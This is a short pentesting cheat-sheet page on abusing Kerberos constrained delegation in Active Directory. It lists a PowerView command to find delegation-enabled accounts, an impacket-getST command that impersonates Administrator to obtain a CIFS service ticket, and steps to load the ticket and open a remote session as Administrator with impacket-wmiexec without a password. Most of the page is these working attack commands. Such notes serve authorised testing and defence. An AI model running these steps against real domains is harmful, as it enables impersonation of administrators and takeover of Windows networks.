---
title: Constrained Delegation Attack
description: If a compromised account has the Kerberos Constrained Delegation right, the account may impersonate another user to request Kerberos service ticket and use it for such as signin services.
tags:
    - Active Directory
    - Kerberos
    - Windows
refs:
date: 2024-02-18
draft: false
---

## Investigation

### Check if Kerberos Constrained Delegation Enabled for User

Reference: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation#prerequisites](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation#prerequisites)

```sh
Get-NetUser -TrustedToAuth
```

<br />

## Exploit

### 1. Request Service Ticket for Another User

The target SPN needs to be allowed for delegation.

```bash
# -k: Use Kerberos Auth
impacket-getST -k -impersonate Administrator -spn cifs/dc.example.local example.local/UserName
```

### 2. Use the Service Ticket

After getting the service ticket, we can use it for further pentesting.  
We need to add the environment variable as below:

```bash
export KRB5CCNAME=`pwd`/Administrator.ccache

# Check by listing tickets.
# If the klist command not found, install it by `apt install krb5-user`
klist
```

- Login to Services with Kerberos Auth
    
    ```bash
    # -k: Use Kerberos Auth
    # -no-pass: No password
    impacket-wmiexec example.local/Administrator@example.local -k -no-pass
    ```